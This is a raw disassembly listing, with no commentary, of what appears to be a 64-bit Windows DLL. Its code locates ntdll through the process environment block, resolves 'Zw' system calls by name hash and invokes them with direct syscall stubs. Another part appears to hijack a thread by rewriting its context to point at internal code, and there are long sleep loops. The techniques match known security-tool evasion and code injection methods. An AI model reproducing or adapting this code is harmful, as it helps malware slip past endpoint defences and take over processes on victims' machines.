   1800034c6:	45 33 ff             	xor    %r15d,%r15d
   1800034c9:	48 8d 8d 00 03 00 00 	lea    0x300(%rbp),%rcx
   1800034d0:	48 8d 15 f9 8c 01 00 	lea    0x18cf9(%rip),%rdx        # 0x18001c1d0
   1800034d7:	44 89 7c 24 48       	mov    %r15d,0x48(%rsp)
   1800034dc:	e8 4f ea ff ff       	call   0x180001f30
   1800034e1:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   1800034e6:	48 8d 95 00 03 00 00 	lea    0x300(%rbp),%rdx
   1800034ed:	48 8d 8d 10 04 00 00 	lea    0x410(%rbp),%rcx
   1800034f4:	e8 17 db ff ff       	call   0x180001010
   1800034f9:	80 38 7b             	cmpb   $0x7b,(%rax)
   1800034fc:	0f 84 ee 00 00 00    	je     0x1800035f0
   180003502:	80 78 16 0f          	cmpb   $0xf,0x16(%rax)
   180003506:	0f 84 e4 00 00 00    	je     0x1800035f0
   18000350c:	80 78 17 0f          	cmpb   $0xf,0x17(%rax)
   180003510:	0f 84 da 00 00 00    	je     0x1800035f0
   180003516:	80 78 18 0f          	cmpb   $0xf,0x18(%rax)
   18000351a:	0f 84 d0 00 00 00    	je     0x1800035f0
   180003520:	8b 54 24 48          	mov    0x48(%rsp),%edx
   180003524:	4d 8b c5             	mov    %r13,%r8
   180003527:	48 8b c8             	mov    %rax,%rcx
   18000352a:	e8 81 ef ff ff       	call   0x1800024b0
   18000352f:	41 8d 4f 3a          	lea    0x3a(%r15),%ecx
   180003533:	66 c7 44 24 40 0f 0f 	movw   $0xf0f,0x40(%rsp)
   18000353a:	e8 95 06 00 00       	call   0x180003bd4
   18000353f:	48 8b d8             	mov    %rax,%rbx
   180003542:	48 8b f8             	mov    %rax,%rdi
   180003545:	33 c0                	xor    %eax,%eax
   180003547:	b9 3a 00 00 00       	mov    $0x3a,%ecx
   18000354c:	f3 aa                	rep stos %al,(%rdi)
   18000354e:	48 85 db             	test   %rbx,%rbx
   180003551:	75 12                	jne    0x180003565
   180003553:	e8 40 4b 00 00       	call   0x180008098
   180003558:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000355e:	e8 79 49 00 00       	call   0x180007edc
   180003563:	eb 13                	jmp    0x180003578
   180003565:	0f 10 05 5c cd 01 00 	movups 0x1cd5c(%rip),%xmm0        # 0x1800202c8
   18000356c:	0f 11 03             	movups %xmm0,(%rbx)
   18000356f:	8b 05 63 cd 01 00    	mov    0x1cd63(%rip),%eax        # 0x1800202d8
   180003575:	89 43 10             	mov    %eax,0x10(%rbx)
   180003578:	48 8d 4b 14          	lea    0x14(%rbx),%rcx
   18000357c:	48 85 c9             	test   %rcx,%rcx
   18000357f:	75 12                	jne    0x180003593
   180003581:	e8 12 4b 00 00       	call   0x180008098
   180003586:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000358c:	e8 4b 49 00 00       	call   0x180007edc
   180003591:	eb 13                	jmp    0x1800035a6
   180003593:	0f 10 05 86 8c 01 00 	movups 0x18c86(%rip),%xmm0        # 0x18001c220
   18000359a:	0f b7 44 24 40       	movzwl 0x40(%rsp),%eax
   18000359f:	0f 11 01             	movups %xmm0,(%rcx)
   1800035a2:	66 89 41 10          	mov    %ax,0x10(%rcx)
   1800035a6:	48 8d 4b 26          	lea    0x26(%rbx),%rcx
   1800035aa:	48 85 c9             	test   %rcx,%rcx
   1800035ad:	75 12                	jne    0x1800035c1
   1800035af:	e8 e4 4a 00 00       	call   0x180008098
   1800035b4:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1800035ba:	e8 1d 49 00 00       	call   0x180007edc
   1800035bf:	eb 13                	jmp    0x1800035d4
   1800035c1:	0f 10 05 60 cc 01 00 	movups 0x1cc60(%rip),%xmm0        # 0x180020228
   1800035c8:	0f 11 01             	movups %xmm0,(%rcx)
   1800035cb:	8b 05 67 cc 01 00    	mov    0x1cc67(%rip),%eax        # 0x180020238
   1800035d1:	89 41 10             	mov    %eax,0x10(%rcx)
   1800035d4:	4c 8d 8d 00 03 00 00 	lea    0x300(%rbp),%r9
   1800035db:	41 b8 3a 00 00 00    	mov    $0x3a,%r8d
   1800035e1:	48 8b d3             	mov    %rbx,%rdx
   1800035e4:	48 8d 8d 10 04 00 00 	lea    0x410(%rbp),%rcx
   1800035eb:	e8 a0 de ff ff       	call   0x180001490
   1800035f0:	4c 8d 35 31 cc 01 00 	lea    0x1cc31(%rip),%r14        # 0x180020228
   1800035f7:	bf 40 01 00 00       	mov    $0x140,%edi
   1800035fc:	0f 1f 40 00          	nopl   0x0(%rax)
   180003600:	b9 07 04 00 00       	mov    $0x407,%ecx
   180003605:	ff 15 5d 0a 01 00    	call   *0x10a5d(%rip)        # 0x180014068
   18000360b:	48 83 ef 01          	sub    $0x1,%rdi
   18000360f:	75 ef                	jne    0x180003600
   180003611:	e9 e1 fa ff ff       	jmp    0x1800030f7
   180003616:	cc                   	int3
   180003617:	cc                   	int3
   180003618:	cc                   	int3
   180003619:	cc                   	int3
   18000361a:	cc                   	int3
   18000361b:	cc                   	int3
   18000361c:	cc                   	int3
   18000361d:	cc                   	int3
   18000361e:	cc                   	int3
   18000361f:	cc                   	int3
   180003620:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180003625:	55                   	push   %rbp
   180003626:	41 56                	push   %r14
   180003628:	41 57                	push   %r15
   18000362a:	48 8d ac 24 20 f3 ff 	lea    -0xce0(%rsp),%rbp
   180003631:	ff 
   180003632:	48 81 ec e0 0d 00 00 	sub    $0xde0,%rsp
   180003639:	48 8b 05 c8 b9 01 00 	mov    0x1b9c8(%rip),%rax        # 0x18001f008
   180003640:	48 33 c4             	xor    %rsp,%rax
   180003643:	48 89 85 d0 0c 00 00 	mov    %rax,0xcd0(%rbp)
   18000364a:	33 d2                	xor    %edx,%edx
   18000364c:	48 8d 8d 50 0c 00 00 	lea    0xc50(%rbp),%rcx
   180003653:	41 b8 80 00 00 00    	mov    $0x80,%r8d
   180003659:	e8 72 1c 00 00       	call   0x1800052d0
   18000365e:	45 33 e4             	xor    %r12d,%r12d
   180003661:	48 8d 8d 50 04 00 00 	lea    0x450(%rbp),%rcx
   180003668:	33 d2                	xor    %edx,%edx
   18000366a:	44 89 64 24 68       	mov    %r12d,0x68(%rsp)
   18000366f:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   180003675:	e8 56 1c 00 00       	call   0x1800052d0
   18000367a:	33 c0                	xor    %eax,%eax
   18000367c:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   180003681:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180003686:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000368b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003690:	c7 44 24 48 1c 00 00 	movl   $0x1c,0x48(%rsp)
   180003697:	00 
   180003698:	ff 15 9a 0a 01 00    	call   *0x10a9a(%rip)        # 0x180014138
   18000369e:	33 d2                	xor    %edx,%edx
   1800036a0:	4c 8b f0             	mov    %rax,%r14
   1800036a3:	8d 4a 04             	lea    0x4(%rdx),%ecx
   1800036a6:	ff 15 b4 09 01 00    	call   *0x109b4(%rip)        # 0x180014060
   1800036ac:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   1800036b1:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1800036b7:	48 8d 95 50 04 00 00 	lea    0x450(%rbp),%rdx
   1800036be:	49 8b ce             	mov    %r14,%rcx
   1800036c1:	4c 8b f8             	mov    %rax,%r15
   1800036c4:	ff 15 2e 0a 01 00    	call   *0x10a2e(%rip)        # 0x1800140f8
   1800036ca:	85 c0                	test   %eax,%eax
   1800036cc:	0f 84 b4 01 00 00    	je     0x180003886
   1800036d2:	48 89 9c 24 00 0e 00 	mov    %rbx,0xe00(%rsp)
   1800036d9:	00 
   1800036da:	41 8b dc             	mov    %r12d,%ebx
   1800036dd:	48 89 b4 24 08 0e 00 	mov    %rsi,0xe08(%rsp)
   1800036e4:	00 
   1800036e5:	8b 74 24 68          	mov    0x68(%rsp),%esi
   1800036e9:	48 c1 ee 03          	shr    $0x3,%rsi
   1800036ed:	48 89 bc 24 10 0e 00 	mov    %rdi,0xe10(%rsp)
   1800036f4:	00 
   1800036f5:	48 85 f6             	test   %rsi,%rsi
   1800036f8:	74 5b                	je     0x180003755
   1800036fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003700:	48 8b bc dd 50 04 00 	mov    0x450(%rbp,%rbx,8),%rdi
   180003707:	00 
   180003708:	4c 8d 85 50 0c 00 00 	lea    0xc50(%rbp),%r8
   18000370f:	48 8b d7             	mov    %rdi,%rdx
   180003712:	41 b9 80 00 00 00    	mov    $0x80,%r9d
   180003718:	49 8b ce             	mov    %r14,%rcx
   18000371b:	ff 15 2f 0a 01 00    	call   *0x10a2f(%rip)        # 0x180014150
   180003721:	48 8d 15 f0 89 01 00 	lea    0x189f0(%rip),%rdx        # 0x18001c118
   180003728:	48 8d 8d 50 0c 00 00 	lea    0xc50(%rbp),%rcx
   18000372f:	e8 4c f5 00 00       	call   0x180012c80
   180003734:	85 c0                	test   %eax,%eax
   180003736:	75 15                	jne    0x18000374d
   180003738:	44 8d 48 18          	lea    0x18(%rax),%r9d
   18000373c:	48 8b d7             	mov    %rdi,%rdx
   18000373f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180003744:	49 8b ce             	mov    %r14,%rcx
   180003747:	ff 15 6b 09 01 00    	call   *0x1096b(%rip)        # 0x1800140b8
   18000374d:	48 ff c3             	inc    %rbx
   180003750:	48 3b de             	cmp    %rsi,%rbx
   180003753:	72 ab                	jb     0x180003700
   180003755:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   18000375a:	49 8b cf             	mov    %r15,%rcx
   18000375d:	ff 15 cd 08 01 00    	call   *0x108cd(%rip)        # 0x180014030
   180003763:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   180003768:	49 8b cf             	mov    %r15,%rcx
   18000376b:	ff 15 37 09 01 00    	call   *0x10937(%rip)        # 0x1800140a8
   180003771:	85 c0                	test   %eax,%eax
   180003773:	0f 84 f5 00 00 00    	je     0x18000386e
   180003779:	48 8d 35 30 f9 ff ff 	lea    -0x6d0(%rip),%rsi        # 0x1800030b0
   180003780:	ff 15 52 09 01 00    	call   *0x10952(%rip)        # 0x1800140d8
   180003786:	39 44 24 54          	cmp    %eax,0x54(%rsp)
   18000378a:	0f 85 ba 00 00 00    	jne    0x18000384a
   180003790:	48 8d 0d 69 8a 01 00 	lea    0x18a69(%rip),%rcx        # 0x18001c200
   180003797:	ff 15 43 09 01 00    	call   *0x10943(%rip)        # 0x1800140e0
   18000379d:	48 8b c8             	mov    %rax,%rcx
   1800037a0:	48 8d 15 39 8a 01 00 	lea    0x18a39(%rip),%rdx        # 0x18001c1e0
   1800037a7:	ff 15 23 09 01 00    	call   *0x10923(%rip)        # 0x1800140d0
   1800037ad:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   1800037b2:	33 d2                	xor    %edx,%edx
   1800037b4:	b9 00 00 00 02       	mov    $0x2000000,%ecx
   1800037b9:	48 8b d8             	mov    %rax,%rbx
   1800037bc:	ff 15 66 09 01 00    	call   *0x10966(%rip)        # 0x180014128
   1800037c2:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1800037c8:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1800037cd:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1800037d2:	48 8b c8             	mov    %rax,%rcx
   1800037d5:	48 8b f8             	mov    %rax,%rdi
   1800037d8:	41 8d 51 01          	lea    0x1(%r9),%edx
   1800037dc:	ff d3                	call   *%rbx
   1800037de:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800037e3:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1800037e8:	48 3b c2             	cmp    %rdx,%rax
   1800037eb:	72 5d                	jb     0x18000384a
   1800037ed:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   1800037f1:	48 03 ca             	add    %rdx,%rcx
   1800037f4:	48 3b c1             	cmp    %rcx,%rax
   1800037f7:	77 51                	ja     0x18000384a
   1800037f9:	48 8b cf             	mov    %rdi,%rcx
   1800037fc:	ff 15 3e 08 01 00    	call   *0x1083e(%rip)        # 0x180014040
   180003802:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   180003807:	8b d8                	mov    %eax,%ebx
   180003809:	ff 15 59 08 01 00    	call   *0x10859(%rip)        # 0x180014068
   18000380f:	83 fb ff             	cmp    $0xffffffff,%ebx
   180003812:	74 36                	je     0x18000384a
   180003814:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   180003818:	c7 45 b0 0b 00 10 00 	movl   $0x10000b,-0x50(%rbp)
   18000381f:	48 8b cf             	mov    %rdi,%rcx
   180003822:	ff 15 a0 08 01 00    	call   *0x108a0(%rip)        # 0x1800140c8
   180003828:	85 c0                	test   %eax,%eax
   18000382a:	74 3d                	je     0x180003869
   18000382c:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   180003830:	48 89 75 78          	mov    %rsi,0x78(%rbp)
   180003834:	48 8b cf             	mov    %rdi,%rcx
   180003837:	ff 15 e3 08 01 00    	call   *0x108e3(%rip)        # 0x180014120
   18000383d:	85 c0                	test   %eax,%eax
   18000383f:	74 21                	je     0x180003862
   180003841:	48 8b cf             	mov    %rdi,%rcx
   180003844:	ff 15 fe 07 01 00    	call   *0x107fe(%rip)        # 0x180014048
   18000384a:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   18000384f:	49 8b cf             	mov    %r15,%rcx
   180003852:	ff 15 50 08 01 00    	call   *0x10850(%rip)        # 0x1800140a8
   180003858:	85 c0                	test   %eax,%eax
   18000385a:	0f 85 20 ff ff ff    	jne    0x180003780
   180003860:	eb 0c                	jmp    0x18000386e
   180003862:	b8 08 00 00 00       	mov    $0x8,%eax
   180003867:	eb 05                	jmp    0x18000386e
   180003869:	b8 04 00 00 00       	mov    $0x4,%eax
   18000386e:	48 8b b4 24 08 0e 00 	mov    0xe08(%rsp),%rsi
   180003875:	00 
   180003876:	48 8b 9c 24 00 0e 00 	mov    0xe00(%rsp),%rbx
   18000387d:	00 
   18000387e:	48 8b bc 24 10 0e 00 	mov    0xe10(%rsp),%rdi
   180003885:	00 
   180003886:	48 8b 8d d0 0c 00 00 	mov    0xcd0(%rbp),%rcx
   18000388d:	48 33 cc             	xor    %rsp,%rcx
   180003890:	e8 1b 03 00 00       	call   0x180003bb0
   180003895:	4c 8b a4 24 18 0e 00 	mov    0xe18(%rsp),%r12
   18000389c:	00 
   18000389d:	48 81 c4 e0 0d 00 00 	add    $0xde0,%rsp
   1800038a4:	41 5f                	pop    %r15
   1800038a6:	41 5e                	pop    %r14
   1800038a8:	5d                   	pop    %rbp
   1800038a9:	c3                   	ret
   1800038aa:	cc                   	int3
   1800038ab:	cc                   	int3
   1800038ac:	cc                   	int3
   1800038ad:	cc                   	int3
   1800038ae:	cc                   	int3
   1800038af:	cc                   	int3
   1800038b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800038b4:	83 3d a5 dc 01 00 00 	cmpl   $0x0,0x1dca5(%rip)        # 0x180021560
   1800038bb:	74 0a                	je     0x1800038c7
   1800038bd:	b8 01 00 00 00       	mov    $0x1,%eax
   1800038c2:	48 83 c4 28          	add    $0x28,%rsp
   1800038c6:	c3                   	ret
   1800038c7:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1800038ce:	00 00 
   1800038d0:	4c 89 64 24 18       	mov    %r12,0x18(%rsp)
   1800038d5:	45 33 e4             	xor    %r12d,%r12d
   1800038d8:	41 8b d4             	mov    %r12d,%edx
   1800038db:	48 8b 48 18          	mov    0x18(%rax),%rcx
   1800038df:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   1800038e3:	49 8b 40 30          	mov    0x30(%r8),%rax
   1800038e7:	48 85 c0             	test   %rax,%rax
   1800038ea:	0f 84 df 01 00 00    	je     0x180003acf
   1800038f0:	4c 8b d0             	mov    %rax,%r10
   1800038f3:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   1800038f7:	42 8b 8c 10 88 00 00 	mov    0x88(%rax,%r10,1),%ecx
   1800038fe:	00 
   1800038ff:	85 c9                	test   %ecx,%ecx
   180003901:	74 2a                	je     0x18000392d
   180003903:	49 8d 14 0a          	lea    (%r10,%rcx,1),%rdx
   180003907:	41 8b 4c 0a 0c       	mov    0xc(%r10,%rcx,1),%ecx
   18000390c:	42 8b 04 11          	mov    (%rcx,%r10,1),%eax
   180003910:	0d 20 20 20 20       	or     $0x20202020,%eax
   180003915:	3d 6e 74 64 6c       	cmp    $0x6c64746e,%eax
   18000391a:	75 11                	jne    0x18000392d
   18000391c:	42 8b 44 11 04       	mov    0x4(%rcx,%r10,1),%eax
   180003921:	0d 20 20 20 20       	or     $0x20202020,%eax
   180003926:	3d 6c 2e 64 6c       	cmp    $0x6c642e6c,%eax
   18000392b:	74 0c                	je     0x180003939
   18000392d:	4d 8b 00             	mov    (%r8),%r8
   180003930:	49 8b 40 30          	mov    0x30(%r8),%rax
   180003934:	48 85 c0             	test   %rax,%rax
   180003937:	75 b7                	jne    0x1800038f0
   180003939:	48 85 d2             	test   %rdx,%rdx
   18000393c:	0f 84 8d 01 00 00    	je     0x180003acf
   180003942:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180003947:	8b 5a 18             	mov    0x18(%rdx),%ebx
   18000394a:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   18000394f:	8b 6a 24             	mov    0x24(%rdx),%ebp
   180003952:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   180003957:	8b 72 20             	mov    0x20(%rdx),%esi
   18000395a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000395f:	49 03 f2             	add    %r10,%rsi
   180003962:	4c 89 6c 24 10       	mov    %r13,0x10(%rsp)
   180003967:	41 bd 5a 77 00 00    	mov    $0x775a,%r13d
   18000396d:	4c 89 74 24 08       	mov    %r14,0x8(%rsp)
   180003972:	44 8b 72 1c          	mov    0x1c(%rdx),%r14d
   180003976:	41 8b d4             	mov    %r12d,%edx
   180003979:	4d 03 f2             	add    %r10,%r14
   18000397c:	4c 89 3c 24          	mov    %r15,(%rsp)
   180003980:	49 03 ea             	add    %r10,%rbp
   180003983:	4c 8d 3d d6 db 01 00 	lea    0x1dbd6(%rip),%r15        # 0x180021560
   18000398a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003990:	ff cb                	dec    %ebx
   180003992:	44 8b 1c 9e          	mov    (%rsi,%rbx,4),%r11d
   180003996:	4d 03 da             	add    %r10,%r11
   180003999:	66 45 39 2b          	cmp    %r13w,(%r11)
   18000399d:	75 54                	jne    0x1800039f3
   18000399f:	45 8b cc             	mov    %r12d,%r9d
   1800039a2:	41 b8 97 ad 33 1a    	mov    $0x1a33ad97,%r8d
   1800039a8:	45 38 0b             	cmp    %r9b,(%r11)
   1800039ab:	74 1f                	je     0x1800039cc
   1800039ad:	49 8b c3             	mov    %r11,%rax
   1800039b0:	0f b7 00             	movzwl (%rax),%eax
   1800039b3:	41 8b c8             	mov    %r8d,%ecx
   1800039b6:	c1 c9 08             	ror    $0x8,%ecx
   1800039b9:	41 ff c1             	inc    %r9d
   1800039bc:	03 c8                	add    %eax,%ecx
   1800039be:	41 8b c1             	mov    %r9d,%eax
   1800039c1:	49 03 c3             	add    %r11,%rax
   1800039c4:	44 33 c1             	xor    %ecx,%r8d
   1800039c7:	44 38 20             	cmp    %r12b,(%rax)
   1800039ca:	75 e4                	jne    0x1800039b0
   1800039cc:	8b ca                	mov    %edx,%ecx
   1800039ce:	ff c2                	inc    %edx
   1800039d0:	48 03 c9             	add    %rcx,%rcx
   1800039d3:	45 89 44 cf 08       	mov    %r8d,0x8(%r15,%rcx,8)
   1800039d8:	0f b7 44 5d 00       	movzwl 0x0(%rbp,%rbx,2),%eax
   1800039dd:	41 8b 04 86          	mov    (%r14,%rax,4),%eax
   1800039e1:	41 89 44 cf 0c       	mov    %eax,0xc(%r15,%rcx,8)
   1800039e6:	4d 89 64 cf 10       	mov    %r12,0x10(%r15,%rcx,8)
   1800039eb:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
   1800039f1:	74 04                	je     0x1800039f7
   1800039f3:	85 db                	test   %ebx,%ebx
   1800039f5:	75 99                	jne    0x180003990
   1800039f7:	4c 8b 74 24 08       	mov    0x8(%rsp),%r14
   1800039fc:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800039ff:	4c 8b 6c 24 10       	mov    0x10(%rsp),%r13
   180003a04:	45 8b dc             	mov    %r12d,%r11d
   180003a07:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   180003a0c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003a11:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180003a16:	89 15 44 db 01 00    	mov    %edx,0x1db44(%rip)        # 0x180021560
   180003a1c:	85 c0                	test   %eax,%eax
   180003a1e:	0f 84 93 00 00 00    	je     0x180003ab7
   180003a24:	0f 1f 40 00          	nopl   0x0(%rax)
   180003a28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180003a2f:	00 
   180003a30:	8b ca                	mov    %edx,%ecx
   180003a32:	41 8b c4             	mov    %r12d,%eax
   180003a35:	41 2b cb             	sub    %r11d,%ecx
   180003a38:	83 f9 01             	cmp    $0x1,%ecx
   180003a3b:	74 6b                	je     0x180003aa8
   180003a3d:	0f 1f 00             	nopl   (%rax)
   180003a40:	44 8d 50 01          	lea    0x1(%rax),%r10d
   180003a44:	44 8b c8             	mov    %eax,%r9d
   180003a47:	4d 03 c9             	add    %r9,%r9
   180003a4a:	45 8b c2             	mov    %r10d,%r8d
   180003a4d:	4d 03 c0             	add    %r8,%r8
   180003a50:	43 8b 5c cf 0c       	mov    0xc(%r15,%r9,8),%ebx
   180003a55:	43 3b 5c c7 0c       	cmp    0xc(%r15,%r8,8),%ebx
   180003a5a:	76 3d                	jbe    0x180003a99
   180003a5c:	43 8b 44 c7 08       	mov    0x8(%r15,%r8,8),%eax
   180003a61:	43 8b 54 cf 08       	mov    0x8(%r15,%r9,8),%edx
   180003a66:	4b 8b 4c cf 10       	mov    0x10(%r15,%r9,8),%rcx
   180003a6b:	43 89 44 cf 08       	mov    %eax,0x8(%r15,%r9,8)
   180003a70:	43 8b 44 c7 0c       	mov    0xc(%r15,%r8,8),%eax
   180003a75:	43 89 44 cf 0c       	mov    %eax,0xc(%r15,%r9,8)
   180003a7a:	4b 8b 44 c7 10       	mov    0x10(%r15,%r8,8),%rax
   180003a7f:	4b 89 44 cf 10       	mov    %rax,0x10(%r15,%r9,8)
   180003a84:	43 89 54 c7 08       	mov    %edx,0x8(%r15,%r8,8)
   180003a89:	43 89 5c c7 0c       	mov    %ebx,0xc(%r15,%r8,8)
   180003a8e:	4b 89 4c c7 10       	mov    %rcx,0x10(%r15,%r8,8)
   180003a93:	8b 15 c7 da 01 00    	mov    0x1dac7(%rip),%edx        # 0x180021560
   180003a99:	8b ca                	mov    %edx,%ecx
   180003a9b:	41 8b c2             	mov    %r10d,%eax
   180003a9e:	41 2b cb             	sub    %r11d,%ecx
   180003aa1:	ff c9                	dec    %ecx
   180003aa3:	44 3b d1             	cmp    %ecx,%r10d
   180003aa6:	72 98                	jb     0x180003a40
   180003aa8:	41 ff c3             	inc    %r11d
   180003aab:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180003aae:	44 3b d8             	cmp    %eax,%r11d
   180003ab1:	0f 82 79 ff ff ff    	jb     0x180003a30
   180003ab7:	4c 8b 3c 24          	mov    (%rsp),%r15
   180003abb:	b8 01 00 00 00       	mov    $0x1,%eax
   180003ac0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003ac5:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12
   180003aca:	48 83 c4 28          	add    $0x28,%rsp
   180003ace:	c3                   	ret
   180003acf:	33 c0                	xor    %eax,%eax
   180003ad1:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12
   180003ad6:	48 83 c4 28          	add    $0x28,%rsp
   180003ada:	c3                   	ret
   180003adb:	cc                   	int3
   180003adc:	cc                   	int3
   180003add:	cc                   	int3
   180003ade:	cc                   	int3
   180003adf:	cc                   	int3
   180003ae0:	40 53                	rex push %rbx
   180003ae2:	48 83 ec 20          	sub    $0x20,%rsp
   180003ae6:	8b d9                	mov    %ecx,%ebx
   180003ae8:	e8 c3 fd ff ff       	call   0x1800038b0
   180003aed:	85 c0                	test   %eax,%eax
   180003aef:	74 24                	je     0x180003b15
   180003af1:	8b 15 69 da 01 00    	mov    0x1da69(%rip),%edx        # 0x180021560
   180003af7:	33 c0                	xor    %eax,%eax
   180003af9:	85 d2                	test   %edx,%edx
   180003afb:	74 18                	je     0x180003b15
   180003afd:	4c 8d 05 64 da 01 00 	lea    0x1da64(%rip),%r8        # 0x180021568
   180003b04:	8b c8                	mov    %eax,%ecx
   180003b06:	48 03 c9             	add    %rcx,%rcx
   180003b09:	41 3b 1c c8          	cmp    (%r8,%rcx,8),%ebx
   180003b0d:	74 09                	je     0x180003b18
   180003b0f:	ff c0                	inc    %eax
   180003b11:	3b c2                	cmp    %edx,%eax
   180003b13:	72 ef                	jb     0x180003b04
   180003b15:	83 c8 ff             	or     $0xffffffff,%eax
   180003b18:	48 83 c4 20          	add    $0x20,%rsp
   180003b1c:	5b                   	pop    %rbx
   180003b1d:	c3                   	ret
   180003b1e:	cc                   	int3
   180003b1f:	cc                   	int3
   180003b20:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180003b25:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180003b2a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180003b2f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180003b34:	48 83 ec 28          	sub    $0x28,%rsp
   180003b38:	b9 31 75 9c 41       	mov    $0x419c7531,%ecx
   180003b3d:	e8 9e ff ff ff       	call   0x180003ae0
   180003b42:	48 83 c4 28          	add    $0x28,%rsp
   180003b46:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   180003b4b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180003b50:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180003b55:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   180003b5a:	4c 8b d1             	mov    %rcx,%r10
   180003b5d:	0f 05                	syscall
   180003b5f:	c3                   	ret
   180003b60:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180003b65:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180003b6a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180003b6f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180003b74:	48 83 ec 28          	sub    $0x28,%rsp
   180003b78:	b9 56 d2 a8 b4       	mov    $0xb4a8d256,%ecx
   180003b7d:	e8 5e ff ff ff       	call   0x180003ae0
   180003b82:	48 83 c4 28          	add    $0x28,%rsp
   180003b86:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   180003b8b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180003b90:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180003b95:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   180003b9a:	4c 8b d1             	mov    %rcx,%r10
   180003b9d:	0f 05                	syscall
   180003b9f:	c3                   	ret
   180003ba0:	cc                   	int3
   180003ba1:	cc                   	int3
   180003ba2:	cc                   	int3
   180003ba3:	cc                   	int3
   180003ba4:	cc                   	int3
   180003ba5:	cc                   	int3
   180003ba6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180003bad:	00 00 00 
   180003bb0:	48 3b 0d 51 b4 01 00 	cmp    0x1b451(%rip),%rcx        # 0x18001f008
   180003bb7:	f2 75 12             	bnd jne 0x180003bcc
   180003bba:	48 c1 c1 10          	rol    $0x10,%rcx
   180003bbe:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180003bc3:	f2 75 02             	bnd jne 0x180003bc8
   180003bc6:	f2 c3                	bnd ret
   180003bc8:	48 c1 c9 10          	ror    $0x10,%rcx
   180003bcc:	e9 bb 03 00 00       	jmp    0x180003f8c
   180003bd1:	cc                   	int3
   180003bd2:	cc                   	int3
   180003bd3:	cc                   	int3
   180003bd4:	e9 1b 06 00 00       	jmp    0x1800041f4
   180003bd9:	cc                   	int3
   180003bda:	cc                   	int3
   180003bdb:	cc                   	int3
   180003bdc:	48 83 ec 28          	sub    $0x28,%rsp
   180003be0:	85 d2                	test   %edx,%edx
   180003be2:	74 39                	je     0x180003c1d
   180003be4:	83 ea 01             	sub    $0x1,%edx
   180003be7:	74 28                	je     0x180003c11
   180003be9:	83 ea 01             	sub    $0x1,%edx
   180003bec:	74 16                	je     0x180003c04
   180003bee:	83 fa 01             	cmp    $0x1,%edx
   180003bf1:	74 0a                	je     0x180003bfd
   180003bf3:	b8 01 00 00 00       	mov    $0x1,%eax
   180003bf8:	48 83 c4 28          	add    $0x28,%rsp
   180003bfc:	c3                   	ret
   180003bfd:	e8 ca 07 00 00       	call   0x1800043cc
   180003c02:	eb 05                	jmp    0x180003c09
   180003c04:	e8 9b 07 00 00       	call   0x1800043a4
   180003c09:	0f b6 c0             	movzbl %al,%eax
   180003c0c:	48 83 c4 28          	add    $0x28,%rsp
   180003c10:	c3                   	ret
   180003c11:	49 8b d0             	mov    %r8,%rdx
   180003c14:	48 83 c4 28          	add    $0x28,%rsp
